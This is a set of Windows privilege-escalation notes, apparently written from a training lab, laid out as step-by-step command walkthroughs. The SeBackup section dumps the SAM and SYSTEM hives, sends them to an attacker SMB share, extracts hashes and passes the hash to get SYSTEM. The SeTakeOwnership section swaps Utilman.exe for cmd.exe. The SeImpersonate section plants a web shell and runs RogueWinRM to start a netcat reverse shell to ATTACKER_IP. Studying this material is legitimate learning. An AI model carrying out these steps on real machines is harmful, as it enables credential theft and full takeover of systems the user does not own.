# Abusing dangerous privileges 

1. SeBackup/SeRestore abuse
2. SeTakeOwnership abuse
3. SeImpersonate/SeAssignPrimaryToken abuse

## Examples

### SAM and SYSTEM registry

This hack consists of copying the `SAM` and `SYSTEM` registry hives to extract the local Administrator's password hash.

1. Check currently assigned privileges:

    whoami /priv

The current account (`Backup`) is part of the "Backup Operators" group, which by default is granted the `SeBackup`and `SeRestore` privileges. Open a command prompt with the "Open as administrator" option to use these privileges.

2. Check privileges again:

```text
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

2. Backup the SAM and SYSTEM hashes:

```text
C:\> reg save hklm\system C:\Users\Backup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\Backup\sam.hive
The operation completed successfully.
```

3. Copy these files to the attacker machine using SMB or any other available method. For SMB, use impacket's `smbserver.py` to start a simple SMB server with a network share in the current directory.

```text
# mkdir share
# python3 /opt/impacket/examples/smbserver.py -smb2support -username Backup -password <password of Backup> public share
```

4. Use the copy command in the Windows machine to transfer both files to the attack machine:

```text
C:\> copy C:\Users\Backup\sam.hive \\<IP address attack machine>\public\
C:\> copy C:\Users\Backup\system.hive \\<IP address attack machine>\public\
```

5. Use impacket to retrieve the users' password hashes:

```text
# python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```

6. Use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with `SYSTEM` privileges:

```text
# python3 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@<IP address attack machine>
...
C:\Windows\system32> whoami
nt authority\system
```

### Replacing Utilman

1. Open a command prompt using "Open as administrator" and check privileges:

```text
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

2. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen. It is run with `SYSTEM` privileges, so `SYSTEM` privileges can be gained by replacing the original binary with any payload. Because we can take ownership of any file, replacing it is trivial.

Take ownership of `utilman.exe`:

```text
C:\> takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".
```

3. Give the user you are logged in as, full permissions over `utilman.exe`

```text
C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files
```

4. Replace `utilman.exe` with a copy of `cmd.exe`:

```text
C:\Windows\System32\> copy cmd.exe utilman.exe
        1 file(s) copied.
```

5. To trigger utilman, lock the screen from the start button, then click on the "Ease of Access" button, which runs `utilman.exe` with `SYSTEM` privileges. 

```text
C:\Windows\system32> whoami
nt authority\system
```

### FTP impersonation

An FTP service running with user `ftp`. Without impersonation, if a user logs into the FTP server and tries to access ftp files, the FTP service would try to access them with its access token rather than Ann's.

With ftp token like this, we must manually configure specific permissions for each served file/directory. The`ftp` user has access to all files. If the FTP service were compromised at some point, the attacker would immediately gain access to all folders to which the ftp user has access.

If instead, the FTP service's user has the `SeImpersonate` or `SeAssignPrimaryToken` privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf. If we manage to take control of a process with `SeImpersonate` or `SeAssignPrimaryToken` privileges, we can impersonate any user connecting and authenticating to that process.

1. Plant a web shell on `http://IP address target/`
2. Use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest.
3. Upload `RogueWinRM` to the target machine. The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port `5985` using `SYSTEM` privileges. Port 5985 is typically used for the `WinRM` service, a port that exposes a Powershell console to be used remotely through the network.

4. Start a netcat listener:

```text
# nc -lvp 4442
```

5. Use the web shell to trigger the RogueWinRM exploit:

```text
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

The `-p` parameter specifies the executable to be run by the exploit, which is `nc64.exe` in this case. The `-a` parameter is used to pass arguments to the executable. The exploit may take up to 2 minutes to work, so the browser may appear unresponsive for a bit. 

```text
c:\windows\system32\inetsrv>whoami
nt authority\system
```

## Notes

Privileges are rights that an account has to perform specific system-related tasks. These tasks can be from the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.

### SeBackup/SeRestore

The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any `DACL` in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges. Having this power, an adversary can trivially escalate privileges on the system by using many techniques. 

### SeTakeOwnership

The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges. For example, search for a service running as SYSTEM and take ownership of the service's executable.

### SeImpersonate/SeAssignPrimaryToken

These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

## Resources

* [Privilege Constants (Author)](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
* [Priv2Admin](https://github.com/gtworek/Priv2Admin)
